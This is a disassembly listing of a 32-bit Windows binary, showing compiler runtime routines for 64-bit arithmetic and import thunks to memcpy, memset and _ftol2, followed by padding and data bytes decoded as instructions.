1003B31E: 33C0                     XOR EAX, EAX
1003B320: 40                       INC EAX
1003B321: C20C00                   RETN 000CH
1003B324: CC                       INT 3 
1003B325: CC                       INT 3 
1003B326: CC                       INT 3 
1003B327: CC                       INT 3 
1003B328: CC                       INT 3 
1003B329: CC                       INT 3 
1003B32A: CC                       INT 3 
1003B32B: CC                       INT 3 
1003B32C: CC                       INT 3 
1003B32D: CC                       INT 3 
1003B32E: CC                       INT 3 
1003B32F: CC                       INT 3 
1003B330: 80F940                   CMP CL, 40H
1003B333: 7315                     JNB 1003B34AH
1003B335: 80F920                   CMP CL, 20H
1003B338: 7306                     JNB 1003B340H
1003B33A: 0FA5C2                   SHLD EDX, EAX, CL
1003B33D: D3E0                     SHL EAX, CL
1003B33F: C3                       RET 
1003B340: 8BD0                     MOV EDX, EAX
1003B342: 33C0                     XOR EAX, EAX
1003B344: 80E11F                   AND CL, 1FH
1003B347: D3E2                     SHL EDX, CL
1003B349: C3                       RET 
1003B34A: 33C0                     XOR EAX, EAX
1003B34C: 33D2                     XOR EDX, EDX
1003B34E: C3                       RET 
1003B34F: CC                       INT 3 
1003B350: FF2538C20310             JMP [1003C238H] ; memcpy
1003B356: CC                       INT 3 
1003B357: CC                       INT 3 
1003B358: CC                       INT 3 
1003B359: CC                       INT 3 
1003B35A: CC                       INT 3 
1003B35B: CC                       INT 3 
1003B35C: CC                       INT 3 
1003B35D: CC                       INT 3 
1003B35E: CC                       INT 3 
1003B35F: CC                       INT 3 
1003B360: 53                       PUSH EBX
1003B361: 57                       PUSH EDI
1003B362: 33FF                     XOR EDI, EDI
1003B364: 8B442410                 MOV EAX, [ESP+10H]
1003B368: 0BC0                     OR EAX, EAX
1003B36A: 7D14                     JNL 1003B380H
1003B36C: 47                       INC EDI
1003B36D: 8B54240C                 MOV EDX, [ESP+0CH]
1003B371: F7D8                     NEG EAX
1003B373: F7DA                     NEG EDX
1003B375: 83D800                   SBB EAX, 00000000H
1003B378: 89442410                 MOV [ESP+10H], EAX
1003B37C: 8954240C                 MOV [ESP+0CH], EDX
1003B380: 8B442418                 MOV EAX, [ESP+18H]
1003B384: 0BC0                     OR EAX, EAX
1003B386: 7D13                     JNL 1003B39BH
1003B388: 8B542414                 MOV EDX, [ESP+14H]
1003B38C: F7D8                     NEG EAX
1003B38E: F7DA                     NEG EDX
1003B390: 83D800                   SBB EAX, 00000000H
1003B393: 89442418                 MOV [ESP+18H], EAX
1003B397: 89542414                 MOV [ESP+14H], EDX
1003B39B: 0BC0                     OR EAX, EAX
1003B39D: 751B                     JNZ 1003B3BAH
1003B39F: 8B4C2414                 MOV ECX, [ESP+14H]
1003B3A3: 8B442410                 MOV EAX, [ESP+10H]
1003B3A7: 33D2                     XOR EDX, EDX
1003B3A9: F7F1                     DIV ECX
1003B3AB: 8B44240C                 MOV EAX, [ESP+0CH]
1003B3AF: F7F1                     DIV ECX
1003B3B1: 8BC2                     MOV EAX, EDX
1003B3B3: 33D2                     XOR EDX, EDX
1003B3B5: 4F                       DEC EDI
1003B3B6: 794E                     JNS 1003B406H
1003B3B8: EB53                     JMP 1003B40DH
1003B3BA: 8BD8                     MOV EBX, EAX
1003B3BC: 8B4C2414                 MOV ECX, [ESP+14H]
1003B3C0: 8B542410                 MOV EDX, [ESP+10H]
1003B3C4: 8B44240C                 MOV EAX, [ESP+0CH]
1003B3C8: D1EB                     SHR EBX, 01H
1003B3CA: D1D9                     RCR ECX, 01H
1003B3CC: D1EA                     SHR EDX, 01H
1003B3CE: D1D8                     RCR EAX, 01H
1003B3D0: 0BDB                     OR EBX, EBX
1003B3D2: 75F4                     JNZ 1003B3C8H
1003B3D4: F7F1                     DIV ECX
1003B3D6: 8BC8                     MOV ECX, EAX
1003B3D8: F7642418                 MUL [ESP+18H]
1003B3DC: 91                       XCHG ECX, EAX
1003B3DD: F7642414                 MUL [ESP+14H]
1003B3E1: 03D1                     ADD EDX, ECX
1003B3E3: 720E                     JB 1003B3F3H
1003B3E5: 3B542410                 CMP EDX, [ESP+10H]
1003B3E9: 7708                     JNBE 1003B3F3H
1003B3EB: 720E                     JB 1003B3FBH
1003B3ED: 3B44240C                 CMP EAX, [ESP+0CH]
1003B3F1: 7608                     JBE 1003B3FBH
1003B3F3: 2B442414                 SUB EAX, [ESP+14H]
1003B3F7: 1B542418                 SBB EDX, [ESP+18H]
1003B3FB: 2B44240C                 SUB EAX, [ESP+0CH]
1003B3FF: 1B542410                 SBB EDX, [ESP+10H]
1003B403: 4F                       DEC EDI
1003B404: 7907                     JNS 1003B40DH
1003B406: F7DA                     NEG EDX
1003B408: F7D8                     NEG EAX
1003B40A: 83DA00                   SBB EDX, 00000000H
1003B40D: 5F                       POP EDI
1003B40E: 5B                       POP EBX
1003B40F: C21000                   RETN 0010H
1003B412: FF2534C20310             JMP [1003C234H] ; _ftol2
1003B418: CC                       INT 3 
1003B419: CC                       INT 3 
1003B41A: CC                       INT 3 
1003B41B: CC                       INT 3 
1003B41C: CC                       INT 3 
1003B41D: CC                       INT 3 
1003B41E: CC                       INT 3 
1003B41F: CC                       INT 3 
1003B420: 8B442408                 MOV EAX, [ESP+08H]
1003B424: 8B4C2410                 MOV ECX, [ESP+10H]
1003B428: 0BC8                     OR ECX, EAX
1003B42A: 8B4C240C                 MOV ECX, [ESP+0CH]
1003B42E: 7509                     JNZ 1003B439H
1003B430: 8B442404                 MOV EAX, [ESP+04H]
1003B434: F7E1                     MUL ECX
1003B436: C21000                   RETN 0010H
1003B439: 53                       PUSH EBX
1003B43A: F7E1                     MUL ECX
1003B43C: 8BD8                     MOV EBX, EAX
1003B43E: 8B442408                 MOV EAX, [ESP+08H]
1003B442: F7642414                 MUL [ESP+14H]
1003B446: 03D8                     ADD EBX, EAX
1003B448: 8B442408                 MOV EAX, [ESP+08H]
1003B44C: F7E1                     MUL ECX
1003B44E: 03D3                     ADD EDX, EBX
1003B450: 5B                       POP EBX
1003B451: C21000                   RETN 0010H
1003B454: CC                       INT 3 
1003B455: CC                       INT 3 
1003B456: CC                       INT 3 
1003B457: CC                       INT 3 
1003B458: CC                       INT 3 
1003B459: CC                       INT 3 
1003B45A: CC                       INT 3 
1003B45B: CC                       INT 3 
1003B45C: CC                       INT 3 
1003B45D: CC                       INT 3 
1003B45E: CC                       INT 3 
1003B45F: CC                       INT 3 
1003B460: 57                       PUSH EDI
1003B461: 56                       PUSH ESI
1003B462: 53                       PUSH EBX
1003B463: 33FF                     XOR EDI, EDI
1003B465: 8B442414                 MOV EAX, [ESP+14H]
1003B469: 0BC0                     OR EAX, EAX
1003B46B: 7D14                     JNL 1003B481H
1003B46D: 47                       INC EDI
1003B46E: 8B542410                 MOV EDX, [ESP+10H]
1003B472: F7D8                     NEG EAX
1003B474: F7DA                     NEG EDX
1003B476: 83D800                   SBB EAX, 00000000H
1003B479: 89442414                 MOV [ESP+14H], EAX
1003B47D: 89542410                 MOV [ESP+10H], EDX
1003B481: 8B44241C                 MOV EAX, [ESP+1CH]
1003B485: 0BC0                     OR EAX, EAX
1003B487: 7D14                     JNL 1003B49DH
1003B489: 47                       INC EDI
1003B48A: 8B542418                 MOV EDX, [ESP+18H]
1003B48E: F7D8                     NEG EAX
1003B490: F7DA                     NEG EDX
1003B492: 83D800                   SBB EAX, 00000000H
1003B495: 8944241C                 MOV [ESP+1CH], EAX
1003B499: 89542418                 MOV [ESP+18H], EDX
1003B49D: 0BC0                     OR EAX, EAX
1003B49F: 7518                     JNZ 1003B4B9H
1003B4A1: 8B4C2418                 MOV ECX, [ESP+18H]
1003B4A5: 8B442414                 MOV EAX, [ESP+14H]
1003B4A9: 33D2                     XOR EDX, EDX
1003B4AB: F7F1                     DIV ECX
1003B4AD: 8BD8                     MOV EBX, EAX
1003B4AF: 8B442410                 MOV EAX, [ESP+10H]
1003B4B3: F7F1                     DIV ECX
1003B4B5: 8BD3                     MOV EDX, EBX
1003B4B7: EB41                     JMP 1003B4FAH
1003B4B9: 8BD8                     MOV EBX, EAX
1003B4BB: 8B4C2418                 MOV ECX, [ESP+18H]
1003B4BF: 8B542414                 MOV EDX, [ESP+14H]
1003B4C3: 8B442410                 MOV EAX, [ESP+10H]
1003B4C7: D1EB                     SHR EBX, 01H
1003B4C9: D1D9                     RCR ECX, 01H
1003B4CB: D1EA                     SHR EDX, 01H
1003B4CD: D1D8                     RCR EAX, 01H
1003B4CF: 0BDB                     OR EBX, EBX
1003B4D1: 75F4                     JNZ 1003B4C7H
1003B4D3: F7F1                     DIV ECX
1003B4D5: 8BF0                     MOV ESI, EAX
1003B4D7: F764241C                 MUL [ESP+1CH]
1003B4DB: 8BC8                     MOV ECX, EAX
1003B4DD: 8B442418                 MOV EAX, [ESP+18H]
1003B4E1: F7E6                     MUL ESI
1003B4E3: 03D1                     ADD EDX, ECX
1003B4E5: 720E                     JB 1003B4F5H
1003B4E7: 3B542414                 CMP EDX, [ESP+14H]
1003B4EB: 7708                     JNBE 1003B4F5H
1003B4ED: 7207                     JB 1003B4F6H
1003B4EF: 3B442410                 CMP EAX, [ESP+10H]
1003B4F3: 7601                     JBE 1003B4F6H
1003B4F5: 4E                       DEC ESI
1003B4F6: 33D2                     XOR EDX, EDX
1003B4F8: 8BC6                     MOV EAX, ESI
1003B4FA: 4F                       DEC EDI
1003B4FB: 7507                     JNZ 1003B504H
1003B4FD: F7DA                     NEG EDX
1003B4FF: F7D8                     NEG EAX
1003B501: 83DA00                   SBB EDX, 00000000H
1003B504: 5B                       POP EBX
1003B505: 5E                       POP ESI
1003B506: 5F                       POP EDI
1003B507: C21000                   RETN 0010H
1003B50A: FF2530C20310             JMP [1003C230H] ; memset
1003B510: 57                       PUSH EDI
1003B511: 56                       PUSH ESI
1003B512: 55                       PUSH EBP
1003B513: 33FF                     XOR EDI, EDI
1003B515: 33ED                     XOR EBP, EBP
1003B517: 8B442414                 MOV EAX, [ESP+14H]
1003B51B: 0BC0                     OR EAX, EAX
1003B51D: 7D15                     JNL 1003B534H
1003B51F: 47                       INC EDI
1003B520: 45                       INC EBP
1003B521: 8B542410                 MOV EDX, [ESP+10H]
1003B525: F7D8                     NEG EAX
1003B527: F7DA                     NEG EDX
1003B529: 83D800                   SBB EAX, 00000000H
1003B52C: 89442414                 MOV [ESP+14H], EAX
1003B530: 89542410                 MOV [ESP+10H], EDX
1003B534: 8B44241C                 MOV EAX, [ESP+1CH]
1003B538: 0BC0                     OR EAX, EAX
1003B53A: 7D14                     JNL 1003B550H
1003B53C: 47                       INC EDI
1003B53D: 8B542418                 MOV EDX, [ESP+18H]
1003B541: F7D8                     NEG EAX
1003B543: F7DA                     NEG EDX
1003B545: 83D800                   SBB EAX, 00000000H
1003B548: 8944241C                 MOV [ESP+1CH], EAX
1003B54C: 89542418                 MOV [ESP+18H], EDX
1003B550: 0BC0                     OR EAX, EAX
1003B552: 7528                     JNZ 1003B57CH
1003B554: 8B4C2418                 MOV ECX, [ESP+18H]
1003B558: 8B442414                 MOV EAX, [ESP+14H]
1003B55C: 33D2                     XOR EDX, EDX
1003B55E: F7F1                     DIV ECX
1003B560: 8BD8                     MOV EBX, EAX
1003B562: 8B442410                 MOV EAX, [ESP+10H]
1003B566: F7F1                     DIV ECX
1003B568: 8BF0                     MOV ESI, EAX
1003B56A: 8BC3                     MOV EAX, EBX
1003B56C: F7642418                 MUL [ESP+18H]
1003B570: 8BC8                     MOV ECX, EAX
1003B572: 8BC6                     MOV EAX, ESI
1003B574: F7642418                 MUL [ESP+18H]
1003B578: 03D1                     ADD EDX, ECX
1003B57A: EB47                     JMP 1003B5C3H
1003B57C: 8BD8                     MOV EBX, EAX
1003B57E: 8B4C2418                 MOV ECX, [ESP+18H]
1003B582: 8B542414                 MOV EDX, [ESP+14H]
1003B586: 8B442410                 MOV EAX, [ESP+10H]
1003B58A: D1EB                     SHR EBX, 01H
1003B58C: D1D9                     RCR ECX, 01H
1003B58E: D1EA                     SHR EDX, 01H
1003B590: D1D8                     RCR EAX, 01H
1003B592: 0BDB                     OR EBX, EBX
1003B594: 75F4                     JNZ 1003B58AH
1003B596: F7F1                     DIV ECX
1003B598: 8BF0                     MOV ESI, EAX
1003B59A: F764241C                 MUL [ESP+1CH]
1003B59E: 8BC8                     MOV ECX, EAX
1003B5A0: 8B442418                 MOV EAX, [ESP+18H]
1003B5A4: F7E6                     MUL ESI
1003B5A6: 03D1                     ADD EDX, ECX
1003B5A8: 720E                     JB 1003B5B8H
1003B5AA: 3B542414                 CMP EDX, [ESP+14H]
1003B5AE: 7708                     JNBE 1003B5B8H
1003B5B0: 720F                     JB 1003B5C1H
1003B5B2: 3B442410                 CMP EAX, [ESP+10H]
1003B5B6: 7609                     JBE 1003B5C1H
1003B5B8: 4E                       DEC ESI
1003B5B9: 2B442418                 SUB EAX, [ESP+18H]
1003B5BD: 1B54241C                 SBB EDX, [ESP+1CH]
1003B5C1: 33DB                     XOR EBX, EBX
1003B5C3: 2B442410                 SUB EAX, [ESP+10H]
1003B5C7: 1B542414                 SBB EDX, [ESP+14H]
1003B5CB: 4D                       DEC EBP
1003B5CC: 7907                     JNS 1003B5D5H
1003B5CE: F7DA                     NEG EDX
1003B5D0: F7D8                     NEG EAX
1003B5D2: 83DA00                   SBB EDX, 00000000H
1003B5D5: 8BCA                     MOV ECX, EDX
1003B5D7: 8BD3                     MOV EDX, EBX
1003B5D9: 8BD9                     MOV EBX, ECX
1003B5DB: 8BC8                     MOV ECX, EAX
1003B5DD: 8BC6                     MOV EAX, ESI
1003B5DF: 4F                       DEC EDI
1003B5E0: 7507                     JNZ 1003B5E9H
1003B5E2: F7DA                     NEG EDX
1003B5E4: F7D8                     NEG EAX
1003B5E6: 83DA00                   SBB EDX, 00000000H
1003B5E9: 5D                       POP EBP
1003B5EA: 5E                       POP ESI
1003B5EB: 5F                       POP EDI
1003B5EC: C21000                   RETN 0010H
1003B5EF: CC                       INT 3 
1003B5F0: FF250CC20310             JMP [1003C20CH] ; _ftol2_sse
1003B5F6: CC                       INT 3 
1003B5F7: CC                       INT 3 
1003B5F8: CC                       INT 3 
1003B5F9: CC                       INT 3 
1003B5FA: CC                       INT 3 
1003B5FB: CC                       INT 3 
1003B5FC: CC                       INT 3 
1003B5FD: CC                       INT 3 
1003B5FE: CC                       INT 3 
1003B5FF: CC                       INT 3 
1003B600: 53                       PUSH EBX
1003B601: 8B442414                 MOV EAX, [ESP+14H]
1003B605: 0BC0                     OR EAX, EAX
1003B607: 7518                     JNZ 1003B621H
1003B609: 8B4C2410                 MOV ECX, [ESP+10H]
1003B60D: 8B44240C                 MOV EAX, [ESP+0CH]
1003B611: 33D2                     XOR EDX, EDX
1003B613: F7F1                     DIV ECX
1003B615: 8B442408                 MOV EAX, [ESP+08H]
1003B619: F7F1                     DIV ECX
1003B61B: 8BC2                     MOV EAX, EDX
1003B61D: 33D2                     XOR EDX, EDX
1003B61F: EB50                     JMP 1003B671H
1003B621: 8BC8                     MOV ECX, EAX
1003B623: 8B5C2410                 MOV EBX, [ESP+10H]
1003B627: 8B54240C                 MOV EDX, [ESP+0CH]
1003B62B: 8B442408                 MOV EAX, [ESP+08H]
1003B62F: D1E9                     SHR ECX, 01H
1003B631: D1DB                     RCR EBX, 01H
1003B633: D1EA                     SHR EDX, 01H
1003B635: D1D8                     RCR EAX, 01H
1003B637: 0BC9                     OR ECX, ECX
1003B639: 75F4                     JNZ 1003B62FH
1003B63B: F7F3                     DIV EBX
1003B63D: 8BC8                     MOV ECX, EAX
1003B63F: F7642414                 MUL [ESP+14H]
1003B643: 91                       XCHG ECX, EAX
1003B644: F7642410                 MUL [ESP+10H]
1003B648: 03D1                     ADD EDX, ECX
1003B64A: 720E                     JB 1003B65AH
1003B64C: 3B54240C                 CMP EDX, [ESP+0CH]
1003B650: 7708                     JNBE 1003B65AH
1003B652: 720E                     JB 1003B662H
1003B654: 3B442408                 CMP EAX, [ESP+08H]
1003B658: 7608                     JBE 1003B662H
1003B65A: 2B442410                 SUB EAX, [ESP+10H]
1003B65E: 1B542414                 SBB EDX, [ESP+14H]
1003B662: 2B442408                 SUB EAX, [ESP+08H]
1003B666: 1B54240C                 SBB EDX, [ESP+0CH]
1003B66A: F7DA                     NEG EDX
1003B66C: F7D8                     NEG EAX
1003B66E: 83DA00                   SBB EDX, 00000000H
1003B671: 5B                       POP EBX
1003B672: C21000                   RETN 0010H
1003B675: CC                       INT 3 
1003B676: CC                       INT 3 
1003B677: CC                       INT 3 
1003B678: CC                       INT 3 
1003B679: CC                       INT 3 
1003B67A: CC                       INT 3 
1003B67B: CC                       INT 3 
1003B67C: CC                       INT 3 
1003B67D: CC                       INT 3 
1003B67E: CC                       INT 3 
1003B67F: CC                       INT 3 
1003B680: 56                       PUSH ESI
1003B681: 8B442414                 MOV EAX, [ESP+14H]
1003B685: 0BC0                     OR EAX, EAX
1003B687: 7528                     JNZ 1003B6B1H
1003B689: 8B4C2410                 MOV ECX, [ESP+10H]
1003B68D: 8B44240C                 MOV EAX, [ESP+0CH]
1003B691: 33D2                     XOR EDX, EDX
1003B693: F7F1                     DIV ECX
1003B695: 8BD8                     MOV EBX, EAX
1003B697: 8B442408                 MOV EAX, [ESP+08H]
1003B69B: F7F1                     DIV ECX
1003B69D: 8BF0                     MOV ESI, EAX
1003B69F: 8BC3                     MOV EAX, EBX
1003B6A1: F7642410                 MUL [ESP+10H]
1003B6A5: 8BC8                     MOV ECX, EAX
1003B6A7: 8BC6                     MOV EAX, ESI
1003B6A9: F7642410                 MUL [ESP+10H]
1003B6AD: 03D1                     ADD EDX, ECX
1003B6AF: EB47                     JMP 1003B6F8H
1003B6B1: 8BC8                     MOV ECX, EAX
1003B6B3: 8B5C2410                 MOV EBX, [ESP+10H]
1003B6B7: 8B54240C                 MOV EDX, [ESP+0CH]
1003B6BB: 8B442408                 MOV EAX, [ESP+08H]
1003B6BF: D1E9                     SHR ECX, 01H
1003B6C1: D1DB                     RCR EBX, 01H
1003B6C3: D1EA                     SHR EDX, 01H
1003B6C5: D1D8                     RCR EAX, 01H
1003B6C7: 0BC9                     OR ECX, ECX
1003B6C9: 75F4                     JNZ 1003B6BFH
1003B6CB: F7F3                     DIV EBX
1003B6CD: 8BF0                     MOV ESI, EAX
1003B6CF: F7642414                 MUL [ESP+14H]
1003B6D3: 8BC8                     MOV ECX, EAX
1003B6D5: 8B442410                 MOV EAX, [ESP+10H]
1003B6D9: F7E6                     MUL ESI
1003B6DB: 03D1                     ADD EDX, ECX
1003B6DD: 720E                     JB 1003B6EDH
1003B6DF: 3B54240C                 CMP EDX, [ESP+0CH]
1003B6E3: 7708                     JNBE 1003B6EDH
1003B6E5: 720F                     JB 1003B6F6H
1003B6E7: 3B442408                 CMP EAX, [ESP+08H]
1003B6EB: 7609                     JBE 1003B6F6H
1003B6ED: 4E                       DEC ESI
1003B6EE: 2B442410                 SUB EAX, [ESP+10H]
1003B6F2: 1B542414                 SBB EDX, [ESP+14H]
1003B6F6: 33DB                     XOR EBX, EBX
1003B6F8: 2B442408                 SUB EAX, [ESP+08H]
1003B6FC: 1B54240C                 SBB EDX, [ESP+0CH]
1003B700: F7DA                     NEG EDX
1003B702: F7D8                     NEG EAX
1003B704: 83DA00                   SBB EDX, 00000000H
1003B707: 8BCA                     MOV ECX, EDX
1003B709: 8BD3                     MOV EDX, EBX
1003B70B: 8BD9                     MOV EBX, ECX
1003B70D: 8BC8                     MOV ECX, EAX
1003B70F: 8BC6                     MOV EAX, ESI
1003B711: 5E                       POP ESI
1003B712: C21000                   RETN 0010H
1003B715: CC                       INT 3 
1003B716: CC                       INT 3 
1003B717: CC                       INT 3 
1003B718: CC                       INT 3 
1003B719: CC                       INT 3 
1003B71A: CC                       INT 3 
1003B71B: CC                       INT 3 
1003B71C: CC                       INT 3 
1003B71D: CC                       INT 3 
1003B71E: CC                       INT 3 
1003B71F: CC                       INT 3 
1003B720: 80F940                   CMP CL, 40H
1003B723: 7316                     JNB 1003B73BH
1003B725: 80F920                   CMP CL, 20H
1003B728: 7306                     JNB 1003B730H
1003B72A: 0FADD0                   SHRD EAX, EDX, CL
1003B72D: D3FA                     SAR EDX, CL
1003B72F: C3                       RET 
1003B730: 8BC2                     MOV EAX, EDX
1003B732: C1FA1F                   SAR EDX, 1FH
1003B735: 80E11F                   AND CL, 1FH
1003B738: D3F8                     SAR EAX, CL
1003B73A: C3                       RET 
1003B73B: C1FA1F                   SAR EDX, 1FH
1003B73E: 8BC2                     MOV EAX, EDX
1003B740: C3                       RET 
1003B741: 0000                     ADD [EAX], AL
1003B743: 0000                     ADD [EAX], AL
1003B745: 0000                     ADD [EAX], AL
1003B747: 0000                     ADD [EAX], AL
1003B749: 0000                     ADD [EAX], AL
1003B74B: 0000                     ADD [EAX], AL
1003B74D: 0000                     ADD [EAX], AL
1003B74F: 0000                     ADD [EAX], AL
1003B751: 0000                     ADD [EAX], AL
1003B753: 0000                     ADD [EAX], AL
1003B755: 0000                     ADD [EAX], AL
1003B757: 0000                     ADD [EAX], AL
1003B759: 0000                     ADD [EAX], AL
1003B75B: 0000                     ADD [EAX], AL
1003B75D: 0000                     ADD [EAX], AL
1003B75F: 0000                     ADD [EAX], AL
1003B761: 0000                     ADD [EAX], AL
1003B763: 0000                     ADD [EAX], AL
1003B765: 0000                     ADD [EAX], AL
1003B767: 0000                     ADD [EAX], AL
1003B769: 0000                     ADD [EAX], AL
1003B76B: 0000                     ADD [EAX], AL
1003B76D: 0000                     ADD [EAX], AL
1003B76F: 0000                     ADD [EAX], AL
1003B771: 0000                     ADD [EAX], AL
1003B773: 0000                     ADD [EAX], AL
1003B775: 0000                     ADD [EAX], AL
1003B777: 0000                     ADD [EAX], AL
1003B779: 0000                     ADD [EAX], AL
1003B77B: 0000                     ADD [EAX], AL
1003B77D: 0000                     ADD [EAX], AL
1003B77F: 0000                     ADD [EAX], AL
1003B781: 0000                     ADD [EAX], AL
1003B783: 0000                     ADD [EAX], AL
1003B785: 0000                     ADD [EAX], AL
1003B787: 0000                     ADD [EAX], AL
1003B789: 0000                     ADD [EAX], AL
1003B78B: 0000                     ADD [EAX], AL
1003B78D: 0000                     ADD [EAX], AL
1003B78F: 0000                     ADD [EAX], AL
1003B791: 0000                     ADD [EAX], AL
1003B793: 0000                     ADD [EAX], AL
1003B795: 0000                     ADD [EAX], AL
1003B797: 0000                     ADD [EAX], AL
1003B799: 0000                     ADD [EAX], AL
1003B79B: 0000                     ADD [EAX], AL
1003B79D: 0000                     ADD [EAX], AL
1003B79F: 0000                     ADD [EAX], AL
1003B7A1: 0000                     ADD [EAX], AL
1003B7A3: 0000                     ADD [EAX], AL
1003B7A5: 0000                     ADD [EAX], AL
1003B7A7: 0000                     ADD [EAX], AL
1003B7A9: 0000                     ADD [EAX], AL
1003B7AB: 0000                     ADD [EAX], AL
1003B7AD: 0000                     ADD [EAX], AL
1003B7AF: 0000                     ADD [EAX], AL
1003B7B1: 0000                     ADD [EAX], AL
1003B7B3: 0000                     ADD [EAX], AL
1003B7B5: 0000                     ADD [EAX], AL
1003B7B7: 0000                     ADD [EAX], AL
1003B7B9: 0000                     ADD [EAX], AL
1003B7BB: 0000                     ADD [EAX], AL
1003B7BD: 0000                     ADD [EAX], AL
1003B7BF: 0000                     ADD [EAX], AL
1003B7C1: 0000                     ADD [EAX], AL
1003B7C3: 0000                     ADD [EAX], AL
1003B7C5: 0000                     ADD [EAX], AL
1003B7C7: 0000                     ADD [EAX], AL
1003B7C9: 0000                     ADD [EAX], AL
1003B7CB: 0000                     ADD [EAX], AL
1003B7CD: 0000                     ADD [EAX], AL
1003B7CF: 0000                     ADD [EAX], AL
1003B7D1: 0000                     ADD [EAX], AL
1003B7D3: 0000                     ADD [EAX], AL
1003B7D5: 0000                     ADD [EAX], AL
1003B7D7: 0000                     ADD [EAX], AL
1003B7D9: 0000                     ADD [EAX], AL
1003B7DB: 0000                     ADD [EAX], AL
1003B7DD: 0000                     ADD [EAX], AL
1003B7DF: 0000                     ADD [EAX], AL
1003B7E1: 0000                     ADD [EAX], AL
1003B7E3: 0000                     ADD [EAX], AL
1003B7E5: 0000                     ADD [EAX], AL
1003B7E7: 0000                     ADD [EAX], AL
1003B7E9: 0000                     ADD [EAX], AL
1003B7EB: 0000                     ADD [EAX], AL
1003B7ED: 0000                     ADD [EAX], AL
1003B7EF: 0000                     ADD [EAX], AL
1003B7F1: 0000                     ADD [EAX], AL
1003B7F3: 0000                     ADD [EAX], AL
1003B7F5: 0000                     ADD [EAX], AL
1003B7F7: 0000                     ADD [EAX], AL
1003B7F9: 0000                     ADD [EAX], AL
1003B7FB: 0000                     ADD [EAX], AL
1003B7FD: 0000                     ADD [EAX], AL
1003B7FF: 0030                     ADD [EAX], DH
1003B801: 41                       INC ECX
1003B802: 0400                     ADD AL, 00H
1003B804: 44                       INC ESP
1003B805: 41                       INC ECX
1003B806: 0400                     ADD AL, 00H
1003B808: 54                       PUSH ESP
1003B809: 41                       INC ECX
1003B80A: 0400                     ADD AL, 00H
1003B80C: 0000                     ADD [EAX], AL
1003B80E: 0000                     ADD [EAX], AL
1003B810: 1A4104                   SBB AL, [ECX+04H]
1003B813: 0000                     ADD [EAX], AL
1003B815: 0000                     ADD [EAX], AL
1003B817: 0008                     ADD [EAX], CL
1003B819: 3B0400                   CMP EAX, [EAX+EAX]
1003B81C: 183B                     SBB [EBX], BH
1003B81E: 0400                     ADD AL, 00H
1003B820: 2A3B                     SUB BH, [EBX]
1003B822: 0400                     ADD AL, 00H
1003B824: 363B0400                 CMP EAX, SS:[EAX+EAX]
1003B828: 48                       DEC EAX
1003B829: 3B0400                   CMP EAX, [EAX+EAX]
1003B82C: 50                       PUSH EAX
1003B82D: 3B0400                   CMP EAX, [EAX+EAX]
1003B830: 60                       PUSHAD 
1003B831: 3B0400                   CMP EAX, [EAX+EAX]
1003B834: 6E                       OUTSB 
1003B835: 3B0400                   CMP EAX, [EAX+EAX]
1003B838: 7A3B                     JPE 1003B875H
1003B83A: 0400                     ADD AL, 00H
1003B83C: 863B                     XCHG BH, [EBX]
1003B83E: 0400                     ADD AL, 00H
1003B840: 96                       XCHG ESI, EAX
1003B841: 3B0400                   CMP EAX, [EAX+EAX]
1003B844: A6                       CMPSB 
1003B845: 3B0400                   CMP EAX, [EAX+EAX]
1003B848: B63B                     MOV DH, 3BH
1003B84A: 0400                     ADD AL, 00H
1003B84C: C23B04                   RETN 043BH
1003B84F: 00DC                     ADD AH, BL
1003B851: 3B0400                   CMP EAX, [EAX+EAX]
1003B854: E83B0400F4               CALL 0403BC94H
1003B859: 3B0400                   CMP EAX, [EAX+EAX]
1003B85C: 043C                     ADD AL, 3CH
1003B85E: 0400                     ADD AL, 00H
1003B860: 143C                     ADC AL, 3CH
1003B862: 0400                     ADD AL, 00H
1003B864: 223C04                   AND BH, [ESP+EAX]
1003B867: 0030                     ADD [EAX], DH
1003B869: 3C04                     CMP AL, 04H
1003B86B: 003C3C                   ADD [ESP+EDI], BH
1003B86E: 0400                     ADD AL, 00H
1003B870: 52                       PUSH EDX
1003B871: 3C04                     CMP AL, 04H
1003B873: 00623C                   ADD [EDX+3CH], AH
1003B876: 0400                     ADD AL, 00H
1003B878: 6E                       OUTSB 
1003B879: 3C04                     CMP AL, 04H
1003B87B: 00823C040096             ADD [EDX-69FFFBC4H], AL
1003B881: 3C04                     CMP AL, 04H
1003B883: 00A43C0400B23C           ADD [ESP+EDI+3CB20004H], AH
1003B88A: 0400                     ADD AL, 00H
1003B88C: C43C04                   LES EDI, [ESP+EAX]
1003B88F: 00FC                     ADD AH, BH
1003B891: 3A0400                   CMP AL, [EAX+EAX]
1003B894: E23C                     LOOP 1003B8D2H
1003B896: 0400                     ADD AL, 00H
1003B898: FA                       CLI 
1003B899: 3C04                     CMP AL, 04H
1003B89B: 0012                     ADD [EDX], DL
1003B89D: 3D04002C3D               CMP EAX, 3D2C0004H
1003B8A2: 0400                     ADD AL, 00H
1003B8A4: 3A3D0400463D             CMP BH, [3D460004H]
1003B8AA: 0400                     ADD AL, 00H
1003B8AC: 60                       PUSHAD 
1003B8AD: 3D0400723D               CMP EAX, 3D720004H
1003B8B2: 0400                     ADD AL, 00H
1003B8B4: 8E3D0400A43D             MOV , [3DA40004H]
1003B8BA: 0400                     ADD AL, 00H
1003B8BC: B43D                     MOV AH, 3DH
1003B8BE: 0400                     ADD AL, 00H
1003B8C0: CC                       INT 3 
1003B8C1: 3D0400E23D               CMP EAX, 3DE20004H
1003B8C6: 0400                     ADD AL, 00H
1003B8C8: F8                       CLC 
1003B8C9: 3D0400043E               CMP EAX, 3E040004H
1003B8CE: 0400                     ADD AL, 00H
1003B8D0: 1A3E                     SBB BH, [ESI]
1003B8D2: 0400                     ADD AL, 00H
1003B8D4: 2E3E0400                 ADD AL, 00H
1003B8D8: 40                       INC EAX
1003B8D9: 3E0400                   ADD AL, 00H
1003B8DC: 4E                       DEC ESI
1003B8DD: 3E0400                   ADD AL, 00H
1003B8E0: 663E0400                 ADD AL, 00H
1003B8E4: 7A3E                     JPE 1003B924H
1003B8E6: 0400                     ADD AL, 00H
1003B8E8: 8A3E                     MOV BH, [ESI]
1003B8EA: 0400                     ADD AL, 00H
1003B8EC: 9E                       SAHF 
1003B8ED: 3E0400                   ADD AL, 00H
1003B8F0: B63E                     MOV DH, 3EH
1003B8F2: 0400                     ADD AL, 00H
1003B8F4: CC                       INT 3 
1003B8F5: 3E0400                   ADD AL, 00H
1003B8F8: DC3E                     FDIVR REAL8 PTR [ESI]
1003B8FA: 0400                     ADD AL, 00H
1003B8FC: F23E0400                 REPNZ ADD AL, 00H
1003B900: 023F                     ADD BH, [EDI]
1003B902: 0400                     ADD AL, 00H
1003B904: 123F                     ADC BH, [EDI]
